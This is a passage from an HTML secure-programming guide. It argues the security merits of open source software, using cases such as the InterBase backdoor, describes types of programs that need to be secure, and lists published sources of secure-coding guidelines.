<A
HREF="http://www-106.ibm.com/developerworks/linux/library/l-oss.html?open&#38;I=252,t=gr,p=SeclmpOS"
TARGET="_top"
>Natalie Walker Whitlock&#8217;s IBM DeveloperWorks article</A
>
discusses the pros and cons as well.
Brian Witten, Carl Landwehr, and Micahel Caloyannides [Witten 2001]
published in IEEE Software an article tentatively concluding that
having source code available should work in the favor of system security;
they note:
<A
NAME="AEN300"
></A
><BLOCKQUOTE
CLASS="BLOCKQUOTE"
><P
><SPAN
CLASS="QUOTE"
>&#8220;We can draw four additional conclusions from this discussion. First,
access to source code lets users improve system security -- if they have
the capability and resources to do so. Second, limited tests indicate that
for some cases, open source life cycles produce systems that are less
vulnerable to nonmalicious faults. Third, a survey of three operating
systems indicates that one open source operating system experienced less
exposure in the form of known but unpatched vulnerabilities over a 12-month
period than was experienced by either of two proprietary counterparts.
Last, closed and proprietary system development models face disincentives
toward fielding and supporting more secure systems as long as less secure
systems are more profitable. Notwithstanding these conclusions, arguments
in this important matter are in their formative stages and in dire need of
metrics that can reflect security delivered to the customer.&#8221;</SPAN
></P
></BLOCKQUOTE
></P
><P
>Scott A. Hissam and Daniel Plakosh&#8217;s
<A
HREF="http://www.ics.uci.edu/~wscacchi/Papers/New/IEE_hissam.pdf"
TARGET="_top"
><SPAN
CLASS="QUOTE"
>&#8220;Trust and Vulnerability in Open Source Software&#8221;</SPAN
></A
>
discuss the pluses and minuses of open source software.
As with other papers, they note that just because the software
is open to review, it should not automatically follow that
such a review has actually been performed.
Indeed, they note that this is a general problem for all software,
open or closed - it is often questionable if many people examine any
given piece of software.
One interesting point is that they demonstrate that
attackers can learn about a
vulnerability in a closed source program (Windows)
from patches made to an OSS/FS program (Linux).
In this example,
Linux developers fixed a vulnerability before attackers tried to attack it,
and attackers correctly surmised that a similar problem might be still be in
Windows (and it was).
Unless OSS/FS programs are forbidden, this kind of learning is difficult
to prevent.
Therefore, the existance of an OSS/FS program can reveal the vulnerabilities
of both the OSS/FS and proprietary program performing the same function -
but at in this example, the OSS/FS program was fixed first.</P
></DIV
><DIV
CLASS="SECT2"
><HR><H3
CLASS="SECT2"
><A
NAME="OPEN-SOURCE-SECURITY-NOHALT"
>2.4.2. Why Closing the Source Doesn&#8217;t Halt Attacks</A
></H3
><P
>It&#8217;s been argued that a 
system without source code is more secure because,
since there&#8217;s less information available for an attacker, it should
be harder for an attacker to find the vulnerabilities.
This argument has a number of weaknesses, however, because
although source code is extremely important when trying to add
new capabilities to a program,
attackers generally don&#8217;t need source code to find a vulnerability.
Also, this argument assumes you can always keep the source code a
secret, which is often untrue.</P
><P
>First, it&#8217;s important to distinguish between <SPAN
CLASS="QUOTE"
>&#8220;destructive&#8221;</SPAN
> acts
and <SPAN
CLASS="QUOTE"
>&#8220;constructive&#8221;</SPAN
> acts. In the real world, it is much easier to
destroy a car than to build one. In the software world, it is
much easier to find and exploit a vulnerability than to
add new significant new functionality to that software.
Attackers have many advantages against defenders because of this difference.
Software developers must try to have no security-relevant mistakes
anywhere in their code, while attackers only need to find one.
Developers are primarily paid to get their programs to work...
attackers don&#8217;t need to make the program work, they only need to
find a single weakness. And as I&#8217;ll describe in a moment, it takes
less information to attack a program than to modify one.</P
><P
>Generally attackers (against both open and closed programs) start by
knowing about the general kinds of security problems programs have.
There&#8217;s no point in hiding this information; it&#8217;s already out, and
in any case, defenders need that kind of information to defend
themselves.
Attackers then use techniques to try to find those problems;
I&#8217;ll group the techniques into <SPAN
CLASS="QUOTE"
>&#8220;dynamic&#8221;</SPAN
> techniques (where you
run the program) and <SPAN
CLASS="QUOTE"
>&#8220;static&#8221;</SPAN
> techniques (where you examine
the program&#8217;s code - be it source code or machine code).</P
><P
>In <SPAN
CLASS="QUOTE"
>&#8220;dynamic&#8221;</SPAN
> approaches, an attacker runs the program,
sending it data (often problematic data), and sees
if the programs&#8217; response indicates a common vulnerability.
Open and closed programs have no difference here, since the attacker isn&#8217;t
looking at code.</P
><P
>Attackers may also look at the code, the <SPAN
CLASS="QUOTE"
>&#8220;static&#8221;</SPAN
> approach.
For open source software, they&#8217;ll
probably look at the source code and search it for patterns.
For closed source software, you can search the machine code
(usually presented in assembly language format to simplify the
task) for patterns that suggest security problems.
In fact, there&#8217;s are several tools that do this.
Attackers might also use tools called
<SPAN
CLASS="QUOTE"
>&#8220;decompilers&#8221;</SPAN
> that turn the machine code back into source code
and then search the source code for the vulnerable patterns
(the same way they would search for vulnerabilities in source code
in open source software).
See Flake [2001] for one discussion of how closed code can still be examined
for security vulnerabilities (e.g., using disassemblers).
This point is important:
even if an attacker wanted to use source code to find a vulnerability,
a closed source program has no advantage, because the attacker
can use a disassembler to re-create the source code of the product
(for analysis), or use a binary scanning tool.</P
><P
>Non-developers might ask <SPAN
CLASS="QUOTE"
>&#8220;if decompilers can create source code
from machine code, then why do developers say they need
source code instead of just machine code?&#8221;</SPAN
>
The problem is that although developers don&#8217;t need source
code to find security problems, developers do need source code to make
substantial improvements to the program.
Although decompilers can turn machine code back into a
<SPAN
CLASS="QUOTE"
>&#8220;source code&#8221;</SPAN
> of sorts, the resulting source code
is extremely hard to modify. Typically most understandable names are
lost, so instead of variables like <SPAN
CLASS="QUOTE"
>&#8220;grand_total&#8221;</SPAN
> you get
<SPAN
CLASS="QUOTE"
>&#8220;x123123&#8221;</SPAN
>, instead of methods like <SPAN
CLASS="QUOTE"
>&#8220;display_warning&#8221;</SPAN
> you get
<SPAN
CLASS="QUOTE"
>&#8220;f123124&#8221;</SPAN
>, and the code itself may have spatterings of
assembly in it.
Also, _ALL_ comments and design information are lost.
This isn&#8217;t a serious problem for finding security problems, because
generally you&#8217;re searching for patterns indicating vulnerabilities,
not for internal variable or method names.
Thus, decompilers and binary code scanning tools
can be useful for finding ways to attack programs,
or to see how vulnerable a program is,
but aren&#8217;t helpful for updating programs.</P
><P
>Thus, developers will say <SPAN
CLASS="QUOTE"
>&#8220;source code is vital&#8221;</SPAN
>
when they intend to add functionality), but the fact that the source
code for closed source programs is hidden doesn&#8217;t protect the program
very much.
In fact, users of binary-only programs can have a problem when they
use decompilers or binary scanning tools;
it&#8217;s quite possible for
a diligent user to know of a security flaw they can exploit but
can&#8217;t easily fix, and they many not be able to convince the vendor
to fix it either.</P
><P
>And this assumes you can keep the source code secret from attackers anyway.
For example,
Microsoft has had at least parts of its source code stolen several
times, at least once from Microsoft itself and at least once from
another company it shared data with.
Microsoft also has programs to share its source code with various
governments, companies, and educational settings; some of those
organizations include attackers, and those organizations
could be attacked by others to acquire the source code.
I use this merely as an example; there are many reasons source code
must be shared by many companies.
And this doesn&#8217;t even take into consideration that aggreved workers
might maliciously release the source code.
Depending on long-term secrecy of source code is self-deception; you
many delay its release, but if it&#8217;s important, it will probably be
stolen sooner or later.
Keeping the source code secret makes financial
sense for proprietary vendors as
a way to encourage customers to buy the products and support,
but it is not a strong security measure.</P
></DIV
><DIV
CLASS="SECT2"
><HR><H3
CLASS="SECT2"
><A
NAME="OPEN-SOURCE-SECURITY-SECRETS"
>2.4.3. Why Keeping Vulnerabilities Secret Doesn&#8217;t Make Them Go Away</A
></H3
><P
>Sometimes it&#8217;s noted that a vulnerability that exists but is unknown
can&#8217;t be exploited, so the system <SPAN
CLASS="QUOTE"
>&#8220;practically secure.&#8221;</SPAN
>
In theory this is true, but the problem is that once someone finds
the vulnerability, the finder may just exploit
the vulnerability instead of helping to fix it.
Having unknown vulnerabilities doesn&#8217;t really make the vulnerabilities go away;
it simply means that the vulnerabilities are a time bomb, with no
way to know when they&#8217;ll be exploited.
Fundamentally, the problem of someone exploiting a vulnerability they
discover is a problem for both open and closed source systems.</P
><P
>One related claim sometimes made
(though not as directly related to OSS/FS)
is that people should not post warnings about
vulnerabilities and discuss them.
This sounds good in theory, but the problem is that attackers already
distribute information about vulnerabilities through a large number
of channels.
In short, such approaches would leave
defenders vulnerable, while doing nothing to inhibit attackers.
In the past, companies actively tried to prevent disclosure of vulnerabilities,
but experience showed that, in general, companies didn&#8217;t fix vulnerabilities
until they were widely known to their users (who could then insist that
the vulnerabilities be fixed).
This is all part of the argument for <SPAN
CLASS="QUOTE"
>&#8220;full disclosure.&#8221;</SPAN
>
Gartner Group has a blunt commentary in a CNET.com article titled
<SPAN
CLASS="QUOTE"
>&#8220;Commentary: Hype is the real issue - Tech News.&#8221;</SPAN
>
They stated:
<A
NAME="AEN337"
></A
><BLOCKQUOTE
CLASS="BLOCKQUOTE"
><P
>   The  comments  of  Microsoft&#8217;s  Scott  Culp,  manager of the company&#8217;s
   security  response  center,  echo  a common refrain in a long, ongoing
   battle   over  information.  Discussions  of  morality  regarding  the
   distribution of information go way back and are very familiar. Several
   centuries  ago,  for  example, the church tried to squelch Copernicus'
   and  Galileo&#8217;s  theory  of  the  sun  being at the center of the solar
   system...

  Culp&#8217;s  attempt  to blame "information security professionals" for the
   recent  spate  of  vulnerabilities  in  Microsoft  products is at best
   disingenuous.  Perhaps,  it  also  represents  an  attempt  to deflect
   criticism from the company that built those products...
   
   [The] efforts of all parties contribute to a continuous
   process  of improvement. The more widely vulnerabilities become known,
   the more quickly they get fixed.</P
></BLOCKQUOTE
>&#13;</P
></DIV
><DIV
CLASS="SECT2"
><HR><H3
CLASS="SECT2"
><A
NAME="OPEN-SOURCE-SECURITY-TROJANS"
>2.4.4. How OSS/FS Counters Trojan Horses</A
></H3
><P
>It&#8217;s sometimes argued that open source programs, because there&#8217;s no
enforced control by a single company, permit people to insert Trojan
Horses and other malicious code.
Trojan horses can be inserted into open source code, true, but they
can also be inserted into proprietary code.
A disgruntled or bribed employee can insert malicious code, and
in many organizations it&#8217;s much less likely to be found than in an
open source program.
After all,
no one outside the organization can review the source code, and few
companies review their code internally (or, even if they do, few can
be assured that the reviewed code is actually what is used).
And the notion that a closed-source company can be sued later has little
evidence; nearly all licenses disclaim all warranties, and courts have
generally not held software development companies liable.</P
><P
>Borland&#8217;s InterBase server is an interesting case in point.
Some time between 1992 and 1994, Borland inserted an intentional
<SPAN
CLASS="QUOTE"
>&#8220;back door&#8221;</SPAN
> into their database server, <SPAN
CLASS="QUOTE"
>&#8220;InterBase&#8221;</SPAN
>.
This back door allowed any local or remote user to
manipulate any database object and install arbitrary programs, and
in some cases could lead to controlling the machine as <SPAN
CLASS="QUOTE"
>&#8220;root&#8221;</SPAN
>.
This vulnerability stayed in the product for at least 6 years - no one else
could review the product, and Borland had no incentive to remove the
vulnerability.
Then Borland released its source code on July 2000.
The "Firebird" project began working with the source code, and
uncovered this serious security problem
with InterBase in December 2000.
By January 2001 the CERT announced the existence of this back door as
<A
HREF="http://www.cert.org/advisories/CA-2001-01.html"
TARGET="_top"
>CERT
advisory CA-2001-01</A
>.
What&#8217;s discouraging is that the backdoor can be easily found simply by
looking at an ASCII dump of the program (a common cracker trick).
Once this problem was found by open source developers reviewing
the code, it was patched quickly.
You could argue that, by keeping the password unknown,
the program stayed safe, and that opening the source made
the program less secure.
I think this is nonsense, since ASCII dumps are trivial to do and well-known
as a standard attack technique, and not all attackers have sudden
urges to announce vulnerabilities - in fact, there&#8217;s no way to be
certain that this vulnerability has not been exploited many times.
It&#8217;s clear that after the source was opened, the source code was
reviewed over time, and the vulnerabilities found and fixed.
One way to characterize this is to say that the original code was
vulnerable, its vulnerabilities became easier to exploit
when it was first made open source,
and then finally these vulnerabilities were fixed.</P
></DIV
><DIV
CLASS="SECT2"
><HR><H3
CLASS="SECT2"
><A
NAME="OPEN-SOURCE-SECURITY-OTHER"
>2.4.5. Other Advantages</A
></H3
><P
>The advantages of having source code open extends not just to software
that is being attacked, but also extends to vulnerability assessment
scanners.
Vulnerability assessment scanners intentionally look for vulnerabilities
in configured systems.
A recent Network Computing evaluation found that the best scanner
(which, among other things, found the most legitimate vulnerabilities)
was Nessus, an open source scanner [Forristal 2001].</P
></DIV
><DIV
CLASS="SECT2"
><HR><H3
CLASS="SECT2"
><A
NAME="OPEN-SOURCE-SECURITY-BOTTOM-LINE"
>2.4.6. Bottom Line</A
></H3
><P
>So, what&#8217;s the bottom line?
I personally believe that when a program began as closed source and
is then first made open source, it
often starts less secure for any users (through exposure of
vulnerabilities), and over time (say a few years) it has
the potential to be much more secure than a closed program.
If the program began as open source software, the public scrutiny is
more likely to improve its security before it&#8217;s ready for use by
significant numbers of users, but there are several caveats to this
statement (it&#8217;s not an ironclad rule).
Just making a program open source doesn&#8217;t suddenly make a program secure,
and just because a program is open source does not guarantee security:
<P
></P
><UL
><LI
><P
>First, people have to actually review the code.
This is one of the key points of debate - will people really
review code in an open source project?
All sorts of factors can reduce the amount of review:
being a niche or rarely-used product (where there are few potential reviewers),
having few developers, and use of a rarely-used computer language.
Clearly, a program that has a single developer and no other contributors
of any kind doesn&#8217;t have this kind of review.
On the other hand, a program that has a primary author and many other
people who occasionally examine the code and contribute suggests that there
are others reviewing the code (at least to create contributions).
In general, if there are more reviewers, there&#8217;s generally a higher likelihood
that someone will identify a flaw - this is the basis of the
<SPAN
CLASS="QUOTE"
>&#8220;many eyeballs&#8221;</SPAN
> theory.
Note that, for example, the OpenBSD project continuously examines
programs for security flaws, so the components in its innermost parts
have certainly undergone a lengthy review.
Since OSS/FS discussions are often held publicly, this level of
review is something that potential users can judge for themselves.</P
><P
>One factor that can particularly reduce review likelihood is not actually
being open source.
Some vendors like to posture their <SPAN
CLASS="QUOTE"
>&#8220;disclosed source&#8221;</SPAN
>
(also called <SPAN
CLASS="QUOTE"
>&#8220;source available&#8221;</SPAN
>) programs as
being open source, but since the program owner has extensive exclusive rights,
others will have far less incentive to work <SPAN
CLASS="QUOTE"
>&#8220;for free&#8221;</SPAN
> for the owner
on the code.
Even open source licenses which have unusually
asymmetric rights (such as the MPL) have this problem.
After all, people are less likely to voluntarily participate
if someone else will have rights to their results that they don&#8217;t have
(as Bruce Perens says, <SPAN
CLASS="QUOTE"
>&#8220;who wants to be someone else&#8217;s unpaid employee?&#8221;</SPAN
>).
In particular,
since the reviewers with the most incentive tend to be people trying to modify
the program, this disincentive to participate reduces the number of
<SPAN
CLASS="QUOTE"
>&#8220;eyeballs&#8221;</SPAN
>.
Elias Levy made this mistake in his article about open source
security; his examples of software that had been broken into
(e.g., TIS&#8217;s Gauntlet) were not, at the time, open source.</P
></LI
><LI
><P
>Second, at least some of the people developing and
reviewing the code must know how to write secure programs.
Hopefully the existence of this book will help.
Clearly, it doesn&#8217;t matter if there are <SPAN
CLASS="QUOTE"
>&#8220;many eyeballs&#8221;</SPAN
> if none of the
eyeballs know what to look for.
Note that it&#8217;s not necessary for everyone to know how to write
secure programs, as long as those who do know how are examining the
code changes.</P
></LI
><LI
><P
>Third, once found, these problems need to be fixed quickly
and their fixes distributed.
Open source systems tend to fix the problems quickly, but the distribution
is not always smooth.
For example, the OpenBSD developers do an excellent job of reviewing code for
security flaws - but they don&#8217;t always report the identified
problems back to the original developer.
Thus, it&#8217;s quite possible for there to be a fixed version in one system,
but for the flaw to remain in another.
I believe this problem is lessening over time, since no one
<SPAN
CLASS="QUOTE"
>&#8220;downstream&#8221;</SPAN
> likes to repeatedly fix the same problem.
Of course, ensuring that security patches are actually installed on
end-user systems is a problem for both open source and closed source software.</P
></LI
></UL
>
Another advantage of open source is that, if you find a problem, you can
fix it immediately.
This really doesn&#8217;t have any counterpart in closed source.</P
><P
>In short, the effect on security of open source software
is still a major debate in the security community, though a large number
of prominent experts believe that it has great potential to be
more secure.</P
></DIV
></DIV
><DIV
CLASS="SECT1"
><HR><H2
CLASS="SECT1"
><A
NAME="TYPES-OF-PROGRAMS"
>2.5. Types of Secure Programs</A
></H2
><P
>Many different types of programs may need to be secure programs
(as the term is defined in this book).
Some common types are:

<P
></P
><UL
><LI
><P
>Application programs used as viewers of remote data.
Programs used as viewers (such as word processors or file format viewers)
are often asked to view data sent remotely by an untrusted user
(this request may be automatically invoked by a web browser).
Clearly, the untrusted
user&#8217;s input should not be allowed to cause the application
to run arbitrary programs.
It&#8217;s usually unwise to support initialization macros (run when the data
is displayed); if you must, then you must create a secure sandbox
(a complex and error-prone task that almost never succeeds, which is why
you shouldn&#8217;t support macros in the first place).
Be careful of issues such as buffer overflow, discussed in
<A
HREF="#BUFFER-OVERFLOW"
>Chapter 6</A
>, which might
allow an untrusted user to force the viewer to run an arbitrary program.</P
></LI
><LI
><P
>Application programs used by the administrator (root).
Such programs shouldn&#8217;t trust information that can be controlled
by non-administrators.</P
></LI
><LI
><P
>Local servers (also called daemons).</P
></LI
><LI
><P
>Network-accessible servers (sometimes called network daemons).</P
></LI
><LI
><P
>Web-based applications (including CGI scripts).
These are a special case of network-accessible servers, but they&#8217;re
so common they deserve their own category.
Such programs are invoked indirectly via a web server, which filters out
some attacks but nevertheless leaves many attacks that must be withstood.</P
></LI
><LI
><P
>Applets (i.e., programs downloaded to the client for automatic execution).
This is something Java is especially famous for, though other languages
(such as Python) support mobile code as well.
There are several security viewpoints here; the implementer of the
applet infrastructure on the client side has to make sure that the
only operations allowed are <SPAN
CLASS="QUOTE"
>&#8220;safe&#8221;</SPAN
> ones, and the writer of an applet has
to deal with the problem of hostile hosts (in other words, you can&#8217;t
normally trust the client).
There is some research attempting to deal with running applets on
hostile hosts, but frankly
I&#8217;m skeptical of the value of these approaches
and this subject is exotic enough that I don&#8217;t cover it further here.</P
></LI
><LI
><P
>setuid/setgid programs.
These programs are invoked by a local user and, when executed, are
immediately granted the privileges of the program&#8217;s owner and/or
owner&#8217;s group.
In many ways these are the hardest programs to secure, because so many
of their inputs are under the control of the untrusted user and some
of those inputs are not obvious.</P
></LI
></UL
>&#13;</P
><P
>This book merges the issues of these different types of program into
a single set.
The disadvantage of this approach is that some of the issues identified
here don&#8217;t apply to all types of programs.
In particular, setuid/setgid programs have many surprising inputs and several
of the guidelines here only apply to them.
However, things are not so clear-cut, because 
a particular program may cut across these boundaries (e.g., a CGI script
may be setuid or setgid, or be configured in a way that has the same effect),
and some programs are divided into several executables each of which
can be considered a different <SPAN
CLASS="QUOTE"
>&#8220;type&#8221;</SPAN
> of program.
The advantage of considering all of these program types together is that we can
consider all issues without trying to apply an inappropriate category
to a program.
As will be seen, many of the principles apply to all programs that
need to be secured.</P
><P
>There is a slight bias in this book toward programs written in
C, with some notes on other languages such as C++, Perl, PHP, Python,
Ada95, and Java.
This is because C is the most common language for
implementing secure programs on Unix-like systems
(other than CGI scripts, which tend to use languages such as
Perl, PHP, or Python).
Also, most other languages&#8217; implementations call the C library.
This is not to imply that C is somehow the <SPAN
CLASS="QUOTE"
>&#8220;best&#8221;</SPAN
> language for this purpose,
and most of the principles described here apply regardless of the
programming language used.</P
></DIV
><DIV
CLASS="SECT1"
><HR><H2
CLASS="SECT1"
><A
NAME="PARANOIA"
>2.6. Paranoia is a Virtue</A
></H2
><P
>The primary difficulty in writing secure programs is that
writing them requires a different mind-set, in short, a paranoid mind-set.
The reason is that the impact of errors (also called defects or bugs)
can be profoundly different.</P
><P
>Normal non-secure programs have many errors.
While these errors are undesirable, these errors usually 
involve rare or unlikely situations, and if a user should stumble upon
one they will try to avoid using the tool that way in the future.</P
><P
>In secure programs, the situation is reversed.
Certain users will intentionally search out and cause rare or unlikely
situations, in the hope that such attacks will give them unwarranted privileges.
As a result, when writing secure programs, paranoia is a virtue.</P
></DIV
><DIV
CLASS="SECT1"
><HR><H2
CLASS="SECT1"
><A
NAME="WHY-WRITE"
>2.7. Why Did I Write This Document?</A
></H2
><P
>One question I&#8217;ve been asked is <SPAN
CLASS="QUOTE"
>&#8220;why did you write this book&#8221;</SPAN
>?
Here&#8217;s my answer:
Over the last several years I&#8217;ve noticed that many application developers
seem to keep falling into the same security pitfalls, again and again.
Auditors were slowly catching problems, but it would have been better
if the problems weren&#8217;t put into the code in the first place.
I believe that part of the problem was that there wasn&#8217;t a single, obvious
place where developers could go and get information on how to avoid
known pitfalls.
The information was publicly available, but it was often hard to find,
out-of-date, incomplete, or had other problems.
Most such information didn&#8217;t particularly discuss Linux at all, even
though it was becoming widely used!
That leads up to the answer: I developed this book
in the hope that future software developers won&#8217;t repeat
past mistakes, resulting in more secure systems.
You can see a larger discussion of this at
<A
HREF="http://www.linuxsecurity.com/feature_stories/feature_story-6.html"
TARGET="_top"
>http://www.linuxsecurity.com/feature_stories/feature_story-6.html</A
>.</P
><P
>A related question that could be asked is
<SPAN
CLASS="QUOTE"
>&#8220;why did you write your own book
instead of just referring to other documents&#8221;</SPAN
>?
There are several answers:

<P
></P
><UL
><LI
><P
>Much of this information was scattered about; placing 
the critical information in one organized document
makes it easier to use.</P
></LI
><LI
><P
>Some of this information is not written for the programmer, but
is written for an administrator or user.</P
></LI
><LI
><P
>Much of the available information emphasizes portable constructs
(constructs that work on all Unix-like systems), and
failed to discuss Linux at all.
It&#8217;s often best to avoid Linux-unique abilities for portability&#8217;s sake,
but sometimes the Linux-unique abilities can really aid security.
Even if non-Linux portability is desired, you may want to support
the Linux-unique abilities when running on Linux.
And, by emphasizing Linux, I can include references to information that
is helpful to someone targeting Linux that is not necessarily true for
others.</P
></LI
></UL
>&#13;</P
></DIV
><DIV
CLASS="SECT1"
><HR><H2
CLASS="SECT1"
><A
NAME="SOURCES-OF-GUIDELINES"
>2.8. Sources of Design and Implementation Guidelines</A
></H2
><P
>Several documents help describe how to write
secure programs (or, alternatively, how to find security problems in
existing programs), and were the basis for the guidelines highlighted
in the rest of this book.&#13;</P
><P
>For general-purpose servers and setuid/setgid programs, there are a number
of valuable documents (though some are difficult to find without
having a reference to them).</P
><P
>Matt Bishop [1996, 1997]
has developed several extremely valuable papers and presentations
on the topic, and in fact he has a web page dedicated to the topic at
<A
HREF="http://olympus.cs.ucdavis.edu/~bishop/secprog.html"
TARGET="_top"
>http://olympus.cs.ucdavis.edu/~bishop/secprog.html</A
>.
AUSCERT has released a programming checklist
<A
HREF="ftp://ftp.auscert.org.au/pub/auscert/papers/secure_programming_checklist"
TARGET="_top"
>[AUSCERT 1996]</A
>,
based in part on chapter 23 of Garfinkel and Spafford&#8217;s book discussing how
to write secure SUID and network programs
<A
HREF="http://www.oreilly.com/catalog/puis"
TARGET="_top"
>[Garfinkel 1996]</A
>.
<A
HREF="http://www.sunworld.com/swol-04-1998/swol-04-security.html"
TARGET="_top"
>Galvin [1998a]</A
> described a simple process and checklist
for developing secure programs; he later updated the checklist in
<A
HREF="http://www.sunworld.com/sunworldonline/swol-08-1998/swol-08-security.html"
TARGET="_top"
>Galvin [1998b]</A
>.
<A
HREF="http://www.pobox.com/~kragen/security-holes.html"
TARGET="_top"
>Sitaker [1999]</A
>
presents a list of issues for the <SPAN
CLASS="QUOTE"
>&#8220;Linux security audit&#8221;</SPAN
> team to search for.
<A
HREF="http://www.homeport.org/~adam/review.html"
TARGET="_top"
>Shostack [1999]</A
>
defines another checklist for reviewing security-sensitive code.
The NCSA
<A
HREF="http://www.ncsa.uiuc.edu/General/Grid/ACES/security/programming"
TARGET="_top"
>[NCSA]</A
>
provides a set of terse but useful secure programming guidelines.
Other useful information sources include the
<EM
>Secure Unix Programming FAQ</EM
>
<A
HREF="http://www.whitefang.com/sup/"
TARGET="_top"
>[Al-Herbish 1999]</A
>,
the
<EM
>Security-Audit&#8217;s Frequently Asked Questions</EM
>
<A
HREF="http://lsap.org/faq.txt"
TARGET="_top"
>[Graham 1999]</A
>,
and
<A
HREF="http://www.clark.net/pub/mjr/pubs/pdf/"
TARGET="_top"
>Ranum [1998]</A
>.
Some recommendations must be taken with caution, for example,
the BSD setuid(7) man page
<A
HREF="http://www.homeport.org/~adam/setuid.7.html"
TARGET="_top"
>[Unknown]</A
>
recommends the use of access(3) without noting the dangerous race conditions
that usually accompany it.
Wood [1985] has some useful but dated advice
in its <SPAN
CLASS="QUOTE"
>&#8220;Security for Programmers&#8221;</SPAN
> chapter.
<A
HREF="http://www.research.att.com/~smb/talks"
TARGET="_top"
>Bellovin [1994]</A
>
includes useful guidelines and some specific examples, such as how to
restructure an ftpd implementation to be simpler and more secure.
FreeBSD provides some guidelines
<A
HREF="http://www.freebsd.org/security/security.html"
TARGET="_top"
>FreeBSD [1999]</A
>
<A
HREF="http://developer.gnome.org/doc/guides/programming-guidelines/book1.html"
TARGET="_top"
>[Quintero 1999]</A
>
is primarily concerned with GNOME programming guidelines, but it
includes a section on security considerations.
<A
HREF="http://www.fish.com/security/murphy.html"
TARGET="_top"
>[Venema 1996]</A
>
provides a detailed discussion (with examples) of some common errors
when programming secure programs (widely-known or predictable passwords,
burning yourself with malicious data, secrets in user-accessible data,
and depending on other programs).
<A
HREF="http://www.fish.com/security/maldata.html"
TARGET="_top"
>[Sibert 1996]</A
>
describes threats arising from malicious data.
Michael Bacarella&#8217;s article
<A
HREF="http://m.bacarella.com/papers/secsoft/html"
TARGET="_top"
>The Peon&#8217;s Guide To Secure System Development</A
>
provides a nice short set of guidelines.</P
><P
>There are many documents giving security guidelines for
programs using
the Common Gateway Interface (CGI) to interface with the web.
These include
<A
HREF="http://www.csclub.uwaterloo.ca/u/mlvanbie/cgisec"
TARGET="_top"
>Van Biesbrouck [1996]</A
>,
<A
HREF="http://language.perl.com/CPAN/doc/FAQs/cgi/perl-cgi-faq.html"
TARGET="_top"
>Gundavaram [unknown]</A
>,
<A
HREF="http://webreview.com/wr/pub/97/08/08/bookshelf"
TARGET="_top"
>[Garfinkle 1997]</A
>
<A
HREF="http://www.eekim.com/pubs/cgibook"
TARGET="_top"
>Kim [1996]</A
>,
<A
HREF="http://www.go2net.com/people/paulp/cgi-security/safe-cgi.txt"
TARGET="_top"
>Phillips [1995]</A
>,
<A
HREF="http://www.w3.org/Security/Faq/www-security-faq.html"
TARGET="_top"
>Stein [1999]</A
>,
<A
HREF="http://members.home.net/razvan.peteanu"
TARGET="_top"
>[Peteanu 2000]</A
>,
and
<A
HREF="http://advosys.ca/tips/web-security.html"
TARGET="_top"
>[Advosys 2000]</A
>.</P
><P
>There are many documents specific to a language, which are further
discussed in the language-specific sections of this book.
For example, the Perl distribution includes
<A
HREF="http://www.perl.com/pub/doc/manual/html/pod/perlsec.html"
TARGET="_top"
>perlsec(1)</A
>, which describes how to use Perl more securely.
The Secure Internet Programming site at
<A
HREF="http://www.cs.princeton.edu/sip"
TARGET="_top"
>http://www.cs.princeton.edu/sip</A
>
is interested in computer security issues in general, but focuses on
mobile code systems such as Java, ActiveX, and JavaScript; Ed Felten
(one of its principles) co-wrote a book on securing Java
(<A
HREF="http://www.securingjava.com"
TARGET="_top"
>[McGraw 1999]</A
>)
which is discussed in <A
HREF="#JAVA"
>Section 10.6</A
>.
Sun&#8217;s security code guidelines provide some guidelines primarily
for Java and C; it is available at
<A
HREF="http://java.sun.com/security/seccodeguide.html"
TARGET="_top"
>http://java.sun.com/security/seccodeguide.html</A
>.</P
><P
>Yoder [1998] contains a collection of patterns to be used
when dealing with application security.
It&#8217;s not really a specific set of guidelines, but a set of commonly-used
patterns for programming that you may find useful.
The Schmoo group maintains a web page linking to information on
how to write secure code at
<A
HREF="http://www.shmoo.com/securecode"
TARGET="_top"
>http://www.shmoo.com/securecode</A
>.</P
><P
>There are many documents describing the issue from
the other direction (i.e., <SPAN
CLASS="QUOTE"
>&#8220;how to crack a system&#8221;</SPAN
>).
One example is McClure [1999], and there&#8217;s countless amounts of material
from that vantage point on the Internet.
There are also more general documents on computer architectures on how
attacks must be developed to exploit them, e.g.,
[LSD 2001].
The Honeynet Project has been collecting information
(including statistics) on how attackers
actually perform their attacks; see their website at
<A
HREF="http://project.honeynet.org"
TARGET="_top"
>http://project.honeynet.org</A
>
for more information.
<A
HREF="http://community.corest.com/~gera/InsecureProgramming/"
TARGET="_top"
>Insecure Programming by example</A
> provides a set of insecure programs, intended for use as
exercises to practice attacking insecure programs.</P
><P
>There&#8217;s also a large body of information on vulnerabilities
already identified in existing programs.
This can be a useful set of
examples of <SPAN
CLASS="QUOTE"
>&#8220;what not to do,&#8221;</SPAN
> though it takes effort to extract more
general guidelines from the large body of specific examples.
There are mailing lists that discuss security issues; one of the most
well-known is
<A
HREF="http://SecurityFocus.com/forums/bugtraq/faq.html"
TARGET="_top"
>Bugtraq</A
>, which among other things develops a list of vulnerabilities.
The CERT Coordination Center (CERT/CC)
is a major reporting center for Internet security problems which
reports on vulnerabilities.
The CERT/CC occasionally produces advisories that
provide a description of a serious security problem
and its impact, along with
instructions on how to obtain a patch or details of a workaround; for
more information see
<A
HREF="http://www.cert.org"
TARGET="_top"
>http://www.cert.org</A
>.
Note that originally the CERT was
a small computer emergency response team, but officially
<SPAN
CLASS="QUOTE"
>&#8220;CERT&#8221;</SPAN
> doesn&#8217;t stand for anything now.
The Department of Energy&#8217;s
<A
HREF="http://ciac.llnl.gov/ciac"
TARGET="_top"
>Computer
Incident Advisory Capability (CIAC)</A
> also reports on vulnerabilities.
These different groups may identify the same vulnerabilities but use different
names.
To resolve this problem,
MITRE supports the Common Vulnerabilities and Exposures (CVE) list
which creates a single unique identifier (<SPAN
CLASS="QUOTE"
>&#8220;name&#8221;</SPAN
>)
for all publicly known vulnerabilities and security exposures
identified by others; see
<A
HREF="http://www.cve.mitre.org"
TARGET="_top"
>http://www.cve.mitre.org</A
>.
NIST&#8217;s ICAT
is a searchable catalog of computer vulnerabilities, categorizing
each CVE vulnerability so that they can be searched
and compared later; see
<A
HREF="http://csrc.nist.gov/icat"
TARGET="_top"
>http://csrc.nist.gov/icat</A
>.</P
><P
>This book is a summary of what I believe are the most
useful and important guidelines.
My goal is a book that
a good programmer can just read and then be fairly well prepared
to implement a secure program.
No single document can really meet this goal, but
I believe the attempt is worthwhile.
My objective is to strike a balance somewhere between a
<SPAN
CLASS="QUOTE"
>&#8220;complete list of all possible guidelines&#8221;</SPAN
>
(that would be unending and unreadable)
and the various <SPAN
CLASS="QUOTE"
